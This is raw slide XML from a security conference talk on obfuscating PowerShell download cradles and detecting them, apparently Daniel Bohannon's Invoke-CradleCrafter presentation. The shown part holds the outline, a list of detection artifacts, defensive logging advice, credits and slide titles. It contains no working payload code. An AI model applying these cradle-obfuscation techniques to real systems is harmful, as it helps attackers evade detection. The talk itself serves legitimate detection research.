              <a:t>CSharp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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powershell.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>csc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.exe </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> cvtres.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26514889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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Registry keys </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cached temporary files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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006885" y="3481167"/>
            <a:ext cx="2523565" cy="430887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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200" dirty="0" err="1" smtClean="0"/>
              <a:t>SendKeys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> + Notepad</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean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24445" y="1945341"/>
            <a:ext cx="4642420" cy="213360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9416" y="4148857"/>
            <a:ext cx="6236413" cy="1941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17676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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>DLL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>s loaded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1" smtClean="0"/>
              <a:t>Prefetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Registry keys </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>of interest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>Appcompat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cached temporary files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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896648" y="1805901"/>
            <a:ext cx="2523565" cy="430887"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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200" dirty="0" smtClean="0"/>
              <a:t>COM Object + Word</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean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7842" y="2371725"/>
            <a:ext cx="7257258" cy="3680638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297048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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation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Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection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MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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30101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Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> Demo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sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Live demo of open source tool: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DISCLAIMER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Please do not use this tool for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>evil.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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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34724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Closing Comments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6441141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2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DO NOT RUN AWAY FROM POWERSHELL!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Upgrade to PowerShell 5.0 ASAP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Enable logging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Increase default log sizes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Aggregate centrally &amp; monitor (start w/GREP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Expand detection to include additional artifacts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>Break all assumptions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>know your options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>, &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" u="sng" dirty="0" smtClean="0"/>
              <a:t>hunt for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0" smtClean="0"/>
              <a:t>Indicators of Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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963383" y="5899964"/>
            <a:ext cx="77186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http://www.petsionary.com/wp-content/uploads/th/these-dogs-are-so-excited-that-the-polar-vortex-is-over-hilarious.jpg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77953" y="811425"/>
            <a:ext cx="4139944" cy="5088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6384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Closing Comments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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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07106" y="1266713"/>
            <a:ext cx="6546522" cy="478564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211015" y="6176963"/>
            <a:ext cx="45451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https://jacobtitanic.files.wordpress.com/2010/09/hindsight-droids.jpg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24554" y="5795834"/>
            <a:ext cx="155986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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PowerShell Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF000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494765" y="5584363"/>
            <a:ext cx="547717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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>____</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11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4372815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2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Accept that you will miss stuff</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Set detection goals one cradle at a time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Learn from your mistakes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Share your successes and failures with the community so we can learn from one another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01477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Credit Where Credit Is Due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dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Nick </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Carr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>ItsReallyNick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Ian </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Ahl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> (@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>TekDefense</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Matt Dunwoody</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>matthewdunwoody</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Evan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Pena</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(@evan_pena2003)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>My wife, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t>Paige</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>100’s of hours of research</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>300 hours of tool development</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Listening to me talk about </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>MOAR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> PowerShell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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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0420" y="1991286"/>
            <a:ext cx="5547813" cy="322617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32218" y="5195677"/>
            <a:ext cx="38727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http://m.cdn.blog.hu/eb/ebakademia/image/izgatott.jpg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34400301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Thank You! Questions?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sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Daniel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Bohannon</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>@</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>daniel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>bohannon</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://danielbohannon.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>github.com/danielbohannon/Invoke-CradleCrafter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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7358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64162</TotalTime>
  <Words>4700</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>1223</Paragraphs>
  <Slides>119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119</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="125" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>MV Boli</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Invoke-CradleCrafter:  Moar PowerShell obFUsk8tion &amp; Detection (@('Tech','niques') -Join '') </vt:lpstr>
      <vt:lpstr>Who I Am</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>DISCLAIMER</vt:lpstr>
      <vt:lpstr>Motivation</vt:lpstr>
      <vt:lpstr>Motivation</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>Current State of PowerShell Obfuscation</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Obfuscating the Cradle: (New-Object Net.WebClient)</vt:lpstr>
      <vt:lpstr>Enough With Tokens…What About Strings?</vt:lpstr>
      <vt:lpstr>Encoding</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Obfuscated Launchers</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>Current State of PowerShell Obfuscation Detection</vt:lpstr>
      <vt:lpstr>Current State of PowerShell Obfuscation Detection</vt:lpstr>
      <vt:lpstr>Outline</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>Obscure Download Cradles</vt:lpstr>
      <vt:lpstr>MOAR! Crafting Cryptic Cradles</vt:lpstr>
      <vt:lpstr>Obscure Token Obfuscation</vt:lpstr>
